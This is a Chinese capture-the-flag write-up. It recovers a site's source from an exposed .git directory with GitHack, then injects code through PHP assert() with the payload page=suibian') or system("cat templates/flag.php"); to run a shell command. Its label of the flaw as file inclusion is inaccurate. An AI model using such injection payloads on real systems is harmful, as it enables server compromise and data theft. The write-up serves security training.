### 做法：

分析.git中泄露的源码

### 思路：

在浏览网页的时候，发现在关于About页面中有Git，尝试访问**.git**文件

> #### .git 源码泄露：
>
> 在利用git init初始化代码仓库时，会生成一个名为.git的隐藏文件，可以利用该文件恢复源代码。发布代码时若不删除该文件会产生.git源码泄露漏洞。

### 步骤：

1. 使用[Githack](https://github.com/lijiejie/GitHack)利用漏洞获取源代码

   > Githack需要用python2环境运行

   ![](http://psfll7bqq.bkt.clouddn.com/1559316932(1).png)

   ![](http://psfll7bqq.bkt.clouddn.com/1559316955(1).png)

2. 获得源码后查看文件，发现flag.php，但是打开后没有可以利用的线索。

   ![](http://psfll7bqq.bkt.clouddn.com/1559411868(1).png)

3. 继续浏览文件，推测突破口可能在index.php中

   ```PHP
   <?php
   
   if (isset($_GET['page'])) {
   	$page = $_GET['page'];
   } else {
   	$page = "home";
   }
   
   $file = "templates/" . $page . ".php";
   
   // I heard '..' is dangerous!
   assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
   
   // TODO: Make this look nice
   assert("file_exists('$file')") or die("That file doesn't exist!");
   
   ?>
   ```

   #### 函数介绍：

   > - assert(str)：str会被解析为代码来执行，返回true或false
   > - strpos(str,obj_str)：返回obj_str在str中第一次出现的位置

4. 审计代码后发现该主机对上传的page值没有做任何过滤，存在可以利用的本地文件包含漏洞。

   可构造恶意page值传入，所用payload：

   `page=suibian') or system("cat templates/flag.php");//`

   拼接后：

   `$file = "templates/" . "suibian') or system("cat templates/flag.php");". ".php";`

   接下来：

   ```php
   assert("strpos('templates/suibian') or system("cat templates/flag.php");
   //.php', '..') === false") or die("Detected hacking attempt!"); 本行已被注释
   ```

   由于strpos返回false，or后的语句被执行。

5. 在注释中找到flag

![](http://psfll7bqq.bkt.clouddn.com/1559323483(1).jpg)

### 参考链接：

<https://blog.csdn.net/silence1_/article/details/89741733>

